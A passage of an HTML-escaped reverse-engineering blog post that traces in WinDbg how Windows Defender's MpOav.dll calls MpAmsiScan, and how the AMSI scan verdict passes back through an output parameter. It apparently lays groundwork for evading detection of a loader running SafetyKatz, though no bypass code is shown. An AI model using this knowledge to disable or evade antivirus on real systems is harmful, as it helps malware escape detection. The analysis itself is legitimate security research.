&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpoav_200_check.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;In our case, comparison turns out to be true.&lt;/p&gt;
&lt;p&gt;A little below that, there&amp;rsquo;s a call to another fuction from this dll.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10d5&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3865&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d6970&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rbp&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3869&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bcd&lt;/span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;rbp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b386c&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ff15f6120300&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x323d8&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7e4b68&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;it seems to take only one argument and it is &lt;code&gt;&amp;amp;rcx+0x70&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_enter_critical_section.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;if we step into it, windbg indentifies function as &lt;code&gt;RtlEnterCriticalSection&lt;/code&gt; from ntdll. According to &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-entercriticalsection&#34;&gt;msdn&lt;/a&gt;,
&lt;code&gt;EnterCriticalState&lt;/code&gt; function waits for ownership of the specified
critical section object. The function returns when the calling thread is granted ownership. function accepts a
single parameter and it
is of &lt;code&gt;LPCRITICAL_SECTION &lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In this case, critical section that this function waits for is &lt;code&gt;rcx+0x70&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_0x98_0x0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;next few instructions compare &lt;code&gt;rsi+0x98&lt;/code&gt; with 0 (both rsi and rcx pointed to same address but since rcx now
points to rcx+0x70, rsi is
used). if comparison fails, it jumps to another location disassembly where &lt;code&gt;LeaveCriticalState&lt;/code&gt; is being called.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_rcx_0x60.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;as shown in the above diagram, function loads &lt;code&gt;rbp&lt;/code&gt;, which points to the critical section (rsi-&amp;gt;0x70) into
&lt;code&gt;rcx&lt;/code&gt;. Then
&lt;code&gt;LeaveCriticalState&lt;/code&gt; function is called.&lt;/p&gt;
&lt;p&gt;then two local variables, rsp+0x54 and rsp+0x50, get initialized to 0x0 and 0x1, following a &lt;code&gt;mov&lt;/code&gt; instruction
which loads a global variable into &lt;code&gt;rcx&lt;/code&gt;. then it does a comparison of &lt;code&gt;rcx+0x60&lt;/code&gt; with 0.&lt;/p&gt;
&lt;p&gt;In our case, comparision fails and for that reason, jump will be taken.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1198&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3928&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b4138&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rax&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;ds&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;00000250&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;a357c158&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00000250&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;a356b1f0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b392c&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c8d442450&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3931&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;498&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bd7&lt;/span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rdx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3934&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b4948&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;here we can see another call.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rcx&lt;/code&gt; is set to &lt;code&gt;[rcx+0x48]&lt;/code&gt; and &lt;code&gt;rdx&lt;/code&gt; is loaded with &lt;code&gt;amsiBuffer&lt;/code&gt; meanwhile &lt;code&gt;r8&lt;/code&gt;, third argument is loaded with
address &lt;code&gt;rsp+0x50&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpamsiscan.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;as we can see in the above diagram, this call is to &lt;code&gt;MPCLIENT!MpAmsiScan&lt;/code&gt; function. This is basically a function
exported by windows defender&amp;rsquo;s MPCLIENT.dll. So this means we have reached our destination.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpclient.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s step over this function and inspect the return value since it is out of scope of this article to reverse
engineer windows defender internals.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpscan_result.png&#34; alt=&#34;MPCLIENT!MpAmsiScan result&#34;&gt;&lt;/p&gt;
&lt;p&gt;According the above diagram, the return value we get is 0x0. And there&amp;rsquo;s no way to determine whether this is a
indication of detection or not because windows documentation does not provide imformation about &lt;code&gt;MpAmsiScan&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Therefore we have to try some tricky methods to identify it.&lt;/p&gt;
&lt;p&gt;First, im going to continue the exection.&lt;/p&gt;
&lt;p&gt;as expected the result is,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/powershell_bad.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Then we can place a breakpoint at the address where &lt;code&gt;MpAmsiScan&lt;/code&gt; return and send some non-malicous input.&lt;/p&gt;
&lt;p&gt;Weirdly enough, return value is same. So this function must be using an output parameter to pass the result of
the scan, just like &lt;code&gt;AmsiScanBuffer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Can you remember that the third parameter to &lt;code&gt;MpAmsiScan&lt;/code&gt; is a pointer to a local variable? Just in case, keep
it&amp;rsquo;s address in mind.&lt;/p&gt;
&lt;p&gt;Somewhere down below, before the program generates an event saying safetykatz is malicious, return value or
output parameter of &lt;code&gt;MpAmsiScan&lt;/code&gt; must be accessed in order determine whether it&amp;rsquo;s detected by windows defender
or not.&lt;/p&gt;
&lt;p&gt;Back to where we left off,&lt;/p&gt;
&lt;p&gt;return value of &lt;code&gt;MpAmsiScan&lt;/code&gt; is stored in &lt;code&gt;edi&lt;/code&gt; register and function compares it with 0 after moving some value
to &lt;code&gt;rcx&lt;/code&gt; register.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3945&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bf8&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;edi&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3947&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b0d32f90300&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x40af0&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7f3280&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11be&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b394e&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ff&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;edi&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;edi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3950&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7925&lt;/span&gt;             &lt;span style=&#34;color:#66d9ef&#34;&gt;jns&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11e7&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b3977&lt;/span&gt;) [&lt;span style=&#34;color:#66d9ef&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;if return value (edi) is greater than or equal to zero,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11e7&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3977&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;837&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c245401&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b397c&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f94c0&lt;/span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;sete&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;al&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b397f&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8886&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c8000000&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;C8h&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;al&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3985&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b442450&lt;/span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fff&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ae7b3989&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;418906&lt;/span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;r14&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;it sets value of third parameter (pointed by r14) to 1 and simply returns. Also note that return value is set to
&lt;code&gt;edi&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;else if return value of &lt;code&gt;MpAmsiScan&lt;/code&gt; (edi) is less than 0,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11c2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3952&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;483&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bcb&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;rbx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3955&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7435&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;je&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11fc&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b398c&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11c7&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3957&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;f6411c01&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Ch&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b395b&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;742&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;f&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;je&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11fc&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b398c&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
